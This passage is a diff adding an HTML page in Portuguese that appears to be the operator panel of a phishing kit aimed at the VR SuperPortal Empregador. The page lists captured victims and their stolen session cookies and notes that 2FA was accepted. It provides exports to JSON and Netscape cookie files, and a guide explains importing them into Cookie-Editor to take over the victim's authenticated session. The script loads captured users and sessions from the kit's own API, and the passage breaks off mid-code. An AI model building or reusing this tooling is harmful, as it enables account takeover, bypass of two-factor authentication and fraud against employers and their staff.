@@ -1,0 +1,936 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>VR Monitor — Acesso à Sessão Finalizada</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #09090b;
+      --card-bg: #121217;
+      --card-hover: #18181f;
+      --border: rgba(255, 255, 255, 0.08);
+      --border-focus: rgba(255, 255, 255, 0.2);
+      --text: #f4f4f5;
+      --text-muted: #a1a1aa;
+      --text-dim: #71717a;
+      --accent-green: #02d72f;
+      --accent-green-dark: #029a24;
+      --accent-green-subtle: rgba(2, 215, 47, 0.12);
+      --accent-purple: #6366f1;
+      --accent-purple-subtle: rgba(99, 102, 241, 0.15);
+      --danger: #ef4444;
+      --danger-subtle: rgba(239, 68, 68, 0.15);
+    }
+
+    /* Modern Dark Selects */
+    .select-group {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: #0d0d11;
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      border-radius: 8px;
+      padding: 2px 10px;
+      transition: border-color .15s ease;
+    }
+    .select-group:focus-within {
+      border-color: rgba(2, 215, 47, 0.5);
+    }
+    .control-select {
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      background: transparent;
+      border: none;
+      color: #fff;
+      font-size: 12px;
+      font-weight: 600;
+      outline: none;
+      cursor: pointer;
+      font-family: inherit;
+      padding: 6px 26px 6px 4px;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23a1a1aa' stroke-width='2.5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 6px center;
+      background-size: 11px;
+    }
+    .control-select option {
+      background-color: #121217;
+      color: #f4f4f5;
+      padding: 8px 12px;
+      font-size: 12px;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      padding: 28px 36px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+    }
+
+    /* Topbar */
+    .topbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 16px;
+      padding-bottom: 20px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .brand-group {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .brand-icon {
+      width: 42px;
+      height: 42px;
+      border-radius: 10px;
+      background: var(--accent-green);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 0 20px rgba(2, 215, 47, 0.3);
+    }
+
+    .brand-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #fff;
+      letter-spacing: -0.4px;
+    }
+
+    .brand-sub {
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-top: 2px;
+    }
+
+    .live-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      padding: 4px 12px;
+      border-radius: 999px;
+      background: var(--accent-green-subtle);
+      border: 1px solid rgba(2, 215, 47, 0.3);
+      color: var(--accent-green);
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 0.5px;
+      text-transform: uppercase;
+    }
+
+    .pulse-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--accent-green);
+      animation: pulse 1.8s infinite;
+    }
+
+    @keyframes pulse {
+      0% { transform: scale(0.9); opacity: 0.7; }
+      50% { transform: scale(1.3); opacity: 1; filter: drop-shadow(0 0 6px var(--accent-green)); }
+      100% { transform: scale(0.9); opacity: 0.7; }
+    }
+
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      padding: 9px 16px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all .18s cubic-bezier(0.16, 1, 0.3, 1);
+      font-family: inherit;
+      text-decoration: none;
+    }
+
+    .btn-primary {
+      background: var(--accent-green);
+      border: 1px solid var(--accent-green);
+      color: #09090b;
+      font-weight: 700;
+      box-shadow: 0 0 16px rgba(2, 215, 47, 0.25);
+    }
+
+    .btn-primary:hover {
+      background: var(--accent-green-dark);
+      border-color: var(--accent-green-dark);
+      color: #fff;
+      transform: translateY(-1px);
+      box-shadow: 0 4px 20px rgba(2, 215, 47, 0.4);
+    }
+
+    .btn-secondary {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      color: var(--text);
+    }
+
+    .btn-secondary:hover {
+      background: var(--card-hover);
+      border-color: var(--border-focus);
+      color: #fff;
+    }
+
+    /* KPI Grid */
+    .metrics-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 16px;
+    }
+
+    .metric-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 18px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+    }
+
+    .metric-title {
+      font-size: 12px;
+      font-weight: 600;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .metric-value {
+      font-size: 22px;
+      font-weight: 700;
+      color: #fff;
+      font-family: 'JetBrains Mono', monospace;
+      word-break: break-all;
+    }
+
+    /* Main Action Card */
+    .hero-card {
+      background: linear-gradient(135deg, rgba(18, 18, 23, 0.95), rgba(9, 9, 11, 0.98));
+      border: 1px solid rgba(2, 215, 47, 0.3);
+      border-radius: 16px;
+      padding: 24px 28px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      box-shadow: 0 12px 32px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+    }
+
+    .hero-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+
+    .hero-title-group h2 {
+      font-size: 18px;
+      font-weight: 700;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .hero-title-group p {
+      font-size: 13px;
+      color: var(--text-muted);
+      margin-top: 4px;
+    }
+
+    .hero-actions-row {
+      display: flex;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    .btn-hero {
+      padding: 12px 22px;
+      font-size: 14px;
+    }
+
+    /* Instruções */
+    .guide-card {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      padding: 20px 24px;
+    }
+
+    .guide-title {
+      font-size: 14px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .guide-steps {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+      gap: 16px;
+    }
+
+    .step-item {
+      background: #09090b;
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 14px 16px;
+      display: flex;
+      gap: 12px;
+    }
+
+    .step-number {
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background: var(--accent-green-subtle);
+      border: 1px solid rgba(2, 215, 47, 0.4);
+      color: var(--accent-green);
+      font-size: 12px;
+      font-weight: 700;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+
+    .step-content h4 {
+      font-size: 13px;
+      font-weight: 600;
+      color: #fff;
+      margin-bottom: 4px;
+    }
+
+    .step-content p {
+      font-size: 12px;
+      color: var(--text-muted);
+      line-height: 1.5;
+    }
+
+    /* Cookies Table */
+    .table-container {
+      background: var(--card-bg);
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .table-header-bar {
+      padding: 16px 20px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 12px;
+    }
+
+    .table-header-bar h3 {
+      font-size: 14px;
+      font-weight: 600;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      text-align: left;
+      font-size: 12px;
+    }
+
+    th {
+      background: #09090b;
+      padding: 12px 16px;
+      font-weight: 600;
+      color: var(--text-dim);
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    td {
+      padding: 12px 16px;
+      border-bottom: 1px solid var(--border);
+      color: var(--text-muted);
+      vertical-align: middle;
+    }
+
+    tr:hover td {
+      background: var(--card-hover);
+    }
+
+    .mono {
+      font-family: 'JetBrains Mono', monospace;
+    }
+
+    .cookie-name {
+      color: #fff;
+      font-weight: 600;
+    }
+
+    .tag-true {
+      background: var(--accent-green-subtle);
+      color: var(--accent-green);
+      border: 1px solid rgba(2, 215, 47, 0.3);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 10px;
+      font-weight: 700;
+    }
+
+    .tag-false {
+      background: rgba(255, 255, 255, 0.05);
+      color: var(--text-dim);
+      border: 1px solid var(--border);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 10px;
+    }
+
+    .val-box {
+      max-width: 260px;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      color: #a1a1aa;
+      font-size: 11px;
+    }
+
+    .icon-btn {
+      background: transparent;
+      border: none;
+      color: var(--text-dim);
+      cursor: pointer;
+      padding: 4px;
+      border-radius: 4px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: all .15s ease;
+    }
+
+    .icon-btn:hover {
+      color: #fff;
+      background: rgba(255,255,255,0.08);
+    }
+
+    /* Toast */
+    #toast {
+      position: fixed;
+      bottom: 24px;
+      right: 24px;
+      background: #18181f;
+      border: 1px solid var(--accent-green);
+      color: #fff;
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+      transform: translateY(100px);
+      opacity: 0;
+      transition: all .25s cubic-bezier(0.16, 1, 0.3, 1);
+      z-index: 100;
+    }
+
+    #toast.show {
+      transform: translateY(0);
+      opacity: 1;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Topbar -->
+  <header class="topbar">
+    <div class="brand-group">
+      <div class="brand-icon">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#09090b" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+      </div>
+      <div>
+        <h1 class="brand-title">Acesso à Sessão Finalizada</h1>
+        <p class="brand-sub" id="sub-usuario">Carregando sessão do usuário...</p>
+      </div>
+    </div>
+
+    <div style="display: flex; align-items: center; gap: 10px; flex-wrap: wrap;">
+      <div class="select-group" title="Selecione o Usuário Capturado">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+        <select id="seletor-usuario-sessao" class="control-select">
+          <option value="">Aguardando seleção de usuário...</option>
+        </select>
+      </div>
+
+      <div class="live-badge" id="session-tenant-badge" style="background: rgba(99, 102, 241, 0.15); border-color: rgba(99, 102, 241, 0.35); color: #818cf8;">
+        <span>Tenant: default</span>
+      </div>
+      <div class="live-badge">
+        <div class="pulse-dot"></div>
+        <span>Sessão Autenticada</span>
+      </div>
+      <a id="btn-abrir-remota" href="/sessaoremota.html" class="btn btn-secondary" style="border-color: rgba(99, 102, 241, 0.4); color: #818cf8;" title="Abrir Navegador Remoto em Tempo Real">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="14" x="2" y="3" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+        <span>Navegador Remoto</span>
+      </a>
+      <a id="link-voltar-painel" href="/painel" class="btn btn-secondary" title="Voltar ao Painel Geral">
+        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="15 18 9 12 15 6"/></svg>
+        <span>Voltar ao Painel</span>
+      </a>
+    </div>
+  </header>
+
+  <!-- Métricas da Sessão -->
+  <section class="metrics-grid">
+    <div class="metric-card">
+      <span class="metric-title">Usuário Autenticado</span>
+      <span class="metric-value" id="kpi-usuario">—</span>
+    </div>
+    <div class="metric-card">
+      <span class="metric-title">Capturado em</span>
+      <span class="metric-value" id="kpi-data" style="font-size: 16px; margin-top: 6px;">—</span>
+    </div>
+    <div class="metric-card">
+      <span class="metric-title">Cookies Válidos</span>
+      <span class="metric-value" id="kpi-cookies" style="color: var(--accent-green);">0</span>
+    </div>
+    <div class="metric-card">
+      <span class="metric-title">Status da Autenticação</span>
+      <span class="metric-value" style="color: var(--accent-green); font-size: 16px; margin-top: 6px;">2FA Aceito • Ativo</span>
+    </div>
+  </section>
+
+  <!-- Card Principal de Ações -->
+  <section class="hero-card">
+    <div class="hero-header">
+      <div class="hero-title-group">
+        <h2>
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5"/><circle cx="8.5" cy="8.5" r=".5"/><circle cx="16" cy="15.5" r=".5"/><circle cx="12" cy="12" r=".5"/><circle cx="11" cy="17" r=".5"/><circle cx="7" cy="14" r=".5"/></svg>
+          <span>Conectar e Acessar Sessão</span>
+        </h2>
+        <p>Acesse diretamente o <strong>SuperPortal Empregador VR</strong> ou importe a sessão autenticada em 1 clique no Cookie-Editor.</p>
+      </div>
+      <div>
+        <span class="mono" id="url-destino-badge" style="font-size: 11px; background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 4px 10px; border-radius: 6px; color: var(--text-muted);">https://superportal-empregador.vr.com.br/</span>
+      </div>
+    </div>
+
+    <div class="hero-actions-row">
+      <a id="btn-abrir-portal" href="https://superportal-empregador.vr.com.br/" target="_blank" class="btn btn-primary btn-hero" title="Abrir portal oficial da VR em nova aba">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+        <span>Abrir SuperPortal Empregador VR</span>
+      </a>
+
+      <button id="btn-copiar-cookie-editor" class="btn btn-secondary btn-hero" type="button" title="Copiar cookies formatados para importar na extensão Cookie-Editor">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
+        <span>Copiar para Cookie-Editor</span>
+      </button>
+
+      <button id="btn-baixar-json" class="btn btn-secondary btn-hero" type="button" title="Baixar arquivo cookies.json">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        <span>Baixar cookies.json</span>
+      </button>
+
+      <button id="btn-baixar-txt" class="btn btn-secondary btn-hero" type="button" title="Baixar cookies no formato Netscape / Curl txt">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+        <span>Baixar Netscape (.txt)</span>
+      </button>
+    </div>
+  </section>
+
+  <!-- Guia Operacional -->
+  <section class="guide-card">
+    <div class="guide-title">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+      <span>Como Usar a Sessão no seu Navegador (Fluxo Completo em 3 Passos)</span>
+    </div>
+
+    <div class="guide-steps">
+      <div class="step-item">
+        <div class="step-number">1</div>
+        <div class="step-content">
+          <h4>Copiar Cookies</h4>
+          <p>Clique no botão <strong>"Copiar para Cookie-Editor"</strong> acima. O payload completo já sai calibrado para os domínios <code>superportal-empregador.vr.com.br</code>, <code>sso-acesso.vr.com.br</code> e <code>.vr.com.br</code>.</p>
+        </div>
+      </div>
+
+      <div class="step-item">
+        <div class="step-number">2</div>
+        <div class="step-content">
+          <h4>Abrir SuperPortal Empregador VR</h4>
+          <p>Clique em <strong>"Abrir SuperPortal Empregador VR"</strong>. Tenha a extensão gratuita <em>Cookie-Editor</em> instalada no seu Chrome, Edge ou Brave.</p>
+        </div>
+      </div>
+
+      <div class="step-item">
+        <div class="step-number">3</div>
+        <div class="step-content">
+          <h4>Importar e Atualizar</h4>
+          <p>Na aba do SuperPortal VR, abra o Cookie-Editor, clique em <strong>Import</strong>, cole o JSON e dê <strong>F5</strong>. A sessão autenticada do empregador estará ativa no seu navegador!</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Tabela de Cookies -->
+  <section class="table-container">
+    <div class="table-header-bar">
+      <h3>
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="18" x="3" y="3" rx="2"/><path d="M3 9h18"/><path d="M9 21V9"/></svg>
+        <span>Cookies Capturados por Domínio</span>
+      </h3>
+      <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
+        <div id="domain-filters" style="display: flex; gap: 6px; background: #09090b; padding: 3px; border-radius: 6px; border: 1px solid var(--border);">
+          <button class="filter-pill active" data-domain="all" type="button" style="background: var(--accent-green-subtle); color: var(--accent-green); border: 1px solid rgba(2, 215, 47, 0.4); padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 700; cursor: pointer; font-family: inherit;">Todos</button>
+          <button class="filter-pill" data-domain="superportal-empregador" type="button" style="background: transparent; color: var(--text-muted); border: 1px solid transparent; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 600; cursor: pointer; font-family: inherit;">superportal-empregador</button>
+          <button class="filter-pill" data-domain="sso-acesso" type="button" style="background: transparent; color: var(--text-muted); border: 1px solid transparent; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 600; cursor: pointer; font-family: inherit;">sso-acesso</button>
+          <button class="filter-pill" data-domain="vr.com.br" type="button" style="background: transparent; color: var(--text-muted); border: 1px solid transparent; padding: 4px 10px; border-radius: 4px; font-size: 11px; font-weight: 600; cursor: pointer; font-family: inherit;">vr.com.br</button>
+        </div>
+        <span class="mono" id="total-linhas-cookies" style="font-size: 11px; color: var(--text-dim);">0 itens</span>
+      </div>
+    </div>
+
+    <div style="overflow-x: auto;">
+      <table>
+        <thead>
+          <tr>
+            <th>Nome</th>
+            <th>Domínio</th>
+            <th>Path</th>
+            <th>Expiração</th>
+            <th>HttpOnly</th>
+            <th>Secure</th>
+            <th>Valor (Truncado)</th>
+            <th style="text-align: right;">Ação</th>
+          </tr>
+        </thead>
+        <tbody id="tbody-cookies">
+          <tr>
+            <td colspan="8" style="text-align: center; padding: 36px; color: var(--text-dim);">Carregando cookies da sessão...</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- Toast -->
+  <div id="toast" role="status" aria-live="polite">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="var(--accent-green)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20 6 9 17l-5-5"/></svg>
+    <span id="toast-msg">Copiado para a área de transferência!</span>
+  </div>
+
+  <script>
+    function sanitizarUsuario(val) {
+      if (!val) return "";
+      let dec = String(val).trim();
+      try {
+        dec = decodeURIComponent(dec);
+        if (dec.includes("%")) {
+          dec = decodeURIComponent(dec);
+        }
+      } catch (e) {}
+      return dec.trim();
+    }
+
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlParts = window.location.pathname.split("/").filter(Boolean);
+    let rawUsuario = urlParts[urlParts.length - 1] || "";
+    if (rawUsuario === "sessao" || rawUsuario === "acesso" || rawUsuario === "sessaoremota") {
+      rawUsuario = urlParams.get("usuario") || "";
+    }
+    const usuarioParam = sanitizarUsuario(rawUsuario);
+    const tenantParam = urlParams.get("tenant") || urlParams.get("cliente") || "";
+
+    let sessaoData = null;
+
+    const subUsuario = document.getElementById("sub-usuario");
+    const kpiUsuario = document.getElementById("kpi-usuario");
+    if (kpiUsuario && usuarioParam) {
+      kpiUsuario.textContent = usuarioParam;
+    }
+    const kpiData = document.getElementById("kpi-data");
+    const kpiCookies = document.getElementById("kpi-cookies");
+    const btnAbrirPortal = document.getElementById("btn-abrir-portal");
+    const btnCopiarCookieEditor = document.getElementById("btn-copiar-cookie-editor");
+    const btnBaixarJson = document.getElementById("btn-baixar-json");
+    const btnBaixarTxt = document.getElementById("btn-baixar-txt");
+    const urlDestinoBadge = document.getElementById("url-destino-badge");
+    const tbodyCookies = document.getElementById("tbody-cookies");
+    const totalLinhasCookies = document.getElementById("total-linhas-cookies");
+    const sessionTenantBadge = document.getElementById("session-tenant-badge");
+    const seletorUsuarioSessao = document.getElementById("seletor-usuario-sessao");
+    const linkVoltarPainel = document.getElementById("link-voltar-painel");
+    const btnAbrirRemota = document.getElementById("btn-abrir-remota");
+    const toast = document.getElementById("toast");
+    const toastMsg = document.getElementById("toast-msg");
+
+    if (sessionTenantBadge) {
+      sessionTenantBadge.innerHTML = `<span>Tenant: ${tenantParam || 'default'}</span>`;
+    }
+    if (linkVoltarPainel) {
+      linkVoltarPainel.href = `/painel${tenantParam ? `?tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+    }
+    if (btnAbrirRemota) {
+      btnAbrirRemota.href = `/sessaoremota.html?usuario=${encodeURIComponent(usuarioParam || '')}${tenantParam ? `&tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+    }
+
+    async function carregarSeletorUsuariosSessao() {
+      if (!seletorUsuarioSessao) return;
+      try {
+        const query = `/api/usuarios?t=${Date.now()}${tenantParam ? `&tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+        const res = await fetch(query);
+        const json = await res.json();
+        if (json.success && Array.isArray(json.usuarios)) {
+          let html = `<option value="">Aguardando seleção de usuário...</option>`;
+          json.usuarios.forEach(u => {
+            const isSel = (usuarioParam && u.usuario.toLowerCase() === usuarioParam.toLowerCase()) ? "selected" : "";
+            const statusTxt = u.tem_sessao_salva ? `${u.total_cookies || 0} cookies` : (u.status || u.status_credencial || "capturado");
+            html += `<option value="${escapeHtml(u.usuario)}" ${isSel}>${escapeHtml(u.usuario)} [${escapeHtml(statusTxt)}]</option>`;
+          });
+          seletorUsuarioSessao.innerHTML = html;
+          if (usuarioParam) {
+            seletorUsuarioSessao.value = usuarioParam;
+          }
+        }
+      } catch (e) {
+        console.error("Erro ao carregar lista de usuários:", e);
+      }
+    }
+
+    if (seletorUsuarioSessao) {
+      seletorUsuarioSessao.addEventListener("change", () => {
+        const u = seletorUsuarioSessao.value.trim();
+        if (u) {
+          window.location.href = `/sessao/${encodeURIComponent(u)}${tenantParam ? `?tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+        } else {
+          window.location.href = `/sessao${tenantParam ? `?tenant=${encodeURIComponent(tenantParam)}` : ''}`;
+        }
+      });
+    }
+
+    function showToast(msg) {
+      if (!toast || !toastMsg) return;
+      toastMsg.textContent = msg;
+      toast.classList.add("show");
+      setTimeout(() => toast.classList.remove("show"), 2500);
+    }
+
+    function copiarTexto(texto, rotulo = "Valor") {
+      if (!texto) return;
+      navigator.clipboard.writeText(texto).then(() => {
+        showToast(`${rotulo} copiado!`);
+      }).catch(() => {
+        const t = document.createElement("textarea");
+        t.value = texto;
+        document.body.appendChild(t);
+        t.select();
+        document.execCommand("copy");
+        document.body.removeChild(t);
+        showToast(`${rotulo} copiado!`);
+      });
+    }
+
+    function atualizarBotoesAcaoSessao(temCookies) {
+      if (btnAbrirPortal) {
+        btnAbrirPortal.style.pointerEvents = temCookies ? "" : "none";
+        btnAbrirPortal.style.opacity = temCookies ? "1" : "0.5";
+        btnAbrirPortal.title = temCookies ? "Abrir SuperPortal Empregador VR" : "Operação indisponível: Nenhum cookie capturado";
+      }
+      [btnCopiarCookieEditor, btnBaixarJson, btnBaixarTxt].forEach(b => {
+        if (b) {
+          b.disabled = !temCookies;
+          b.style.opacity = temCookies ? "1" : "0.5";
+          b.style.cursor = temCookies ? "pointer" : "not-allowed";
+        }
+      });
+    }
+
+    async function carregarSessao() {
+      if (!usuarioParam) {
+        subUsuario.textContent = "Aguardando seleção de um usuário capturado acima...";
+        kpiUsuario.textContent = "—";
+        kpiData.textContent = "—";
+        kpiCookies.textContent = "0";
+        tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--text-muted);">Nenhum usuário selecionado. Escolha um usuário capturado no seletor acima para visualizar seus cookies.</td></tr>`;
+        totalLinhasCookies.textContent = "0 itens";
+        atualizarBotoesAcaoSessao(false);
+        return;
+      }
+      try {
+        const queryTenant = tenantParam ? `&tenant=${encodeURIComponent(tenantParam)}` : '';
+        const apiUrl = `/api/sessao/${encodeURIComponent(usuarioParam)}?t=${Date.now()}${queryTenant}`;
+        const res = await fetch(apiUrl);
+        if (!res.ok) throw new Error("Sessão não localizada");
+        const data = await res.json();
+        sessaoData = data;
+
+        const u = data.usuario || usuarioParam;
+        const t = data.tenant || tenantParam || "default";
+        if (sessionTenantBadge) {
+          sessionTenantBadge.innerHTML = `<span>Tenant: ${t}</span>`;
+        }
+        if (btnAbrirRemota) {
+          btnAbrirRemota.href = `/sessaoremota.html?usuario=${encodeURIComponent(u)}${t ? `&tenant=${encodeURIComponent(t)}` : ''}`;
+        }
+        subUsuario.textContent = `Sessão capturada para o operador da conta: ${u} [Tenant: ${t}]`;
+        kpiUsuario.textContent = u;
+        kpiData.textContent = data.data_hora || "—";
+        kpiCookies.textContent = data.total_cookies || (data.cookies ? data.cookies.length : 0);
+
+        const urlDest = data.url_final || "https://superportal-empregador.vr.com.br/";
+        btnAbrirPortal.href = urlDest;
+        urlDestinoBadge.textContent = urlDest.length > 55 ? urlDest.slice(0, 52) + "..." : urlDest;
+        urlDestinoBadge.title = urlDest;
+
+        const temCookies = Array.isArray(data.cookies) && data.cookies.length > 0;
+        atualizarBotoesAcaoSessao(temCookies);
+        renderizarCookies(data.cookies || []);
+
+      } catch (err) {
+        console.error("Erro ao carregar sessão:", err);
+        subUsuario.textContent = `Sessão não encontrada para: ${usuarioParam}`;
+        tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--danger);">Sessão de cookies ainda não foi finalizada para este usuário. Aguarde a validação do 2FA.</td></tr>`;
+        atualizarBotoesAcaoSessao(false);
+      }
+    }
+
+    let filtroDominioAtivo = "all";
+
+    function renderizarCookies(cookies) {
+      if (!cookies || cookies.length === 0) {
+        tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:32px; color:var(--text-dim);">Nenhum cookie registrado.</td></tr>`;
+        totalLinhasCookies.textContent = "0 itens";
+        return;
+      }
+
+      let filtrados = cookies;
+      if (filtroDominioAtivo !== "all") {
+        filtrados = cookies.filter(c => (c.domain || "").toLowerCase().includes(filtroDominioAtivo));
+      }
+
+      totalLinhasCookies.textContent = `${filtrados.length} de ${cookies.length} itens`;
+
+      if (filtrados.length === 0) {
+        tbodyCookies.innerHTML = `<tr><td colspan="8" style="text-align:center; padding:24px; color:var(--text-dim);">Nenhum cookie encontrado para o filtro selecionado.</td></tr>`;
+        return;
+      }
+
+      let html = "";
+      filtrados.forEach(c => {
+        const exp = c.expires && c.expires > 0 ? new Date(c.expires * 1000).toLocaleString("pt-BR") : "Sessão";
+        const valTrunc = (c.value || "").length > 35 ? (c.value || "").slice(0, 32) + "..." : (c.value || "");
+
+        html += `
+          <tr>
+            <td class="cookie-name mono">${escapeHtml(c.name)}</td>
+            <td class="mono" style="color: var(--accent-green);">${escapeHtml(c.domain)}</td>
